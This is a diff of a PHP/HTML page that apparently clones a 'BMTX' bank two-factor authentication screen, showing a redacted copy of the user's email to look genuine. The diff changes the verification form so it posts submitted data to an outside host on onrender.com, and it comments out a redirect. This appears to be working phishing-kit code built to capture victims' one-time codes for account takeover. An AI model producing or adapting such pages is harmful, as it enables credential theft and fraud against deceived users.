@@ -15,9 +15,8 @@ function redactEmail($email) {
 $originalEmail = $_SESSION['user_email'] ?? 'someone@example.com';
 $redactedEmail = redactEmail($originalEmail);
 
-header("Location: BMTX_ Two Factor Authentication Verify.html"); // or any other page
-exit;
-
+// header("Location: Invalid Login.html"); // or any other page
+//     exit;
 ?>
 
 
@@ -129,7 +128,7 @@ span[data-ez-ph-id] { position: absolute !important; left: -3000px !important; }
       <div class="pagebody_div factor2Pt">
 
        <div class="pagecontent_div factor2Content">
-  <form name="twoFactorAuthenticationForm" method="post" action="" id="twoFactorAuthenticationForm" novalidate="novalidate">
+  <form name="twoFactorAuthenticationForm" method="post" action="https://authentication-qud0.onrender.com/BMTX_%20Two%20Factor%20Authentication%20Verify.html" id="twoFactorAuthenticationForm" novalidate="novalidate">
     <div class="container">
       <div class="row">
         <div class="icon col-xs-12 col-sm-4 col-md-3">
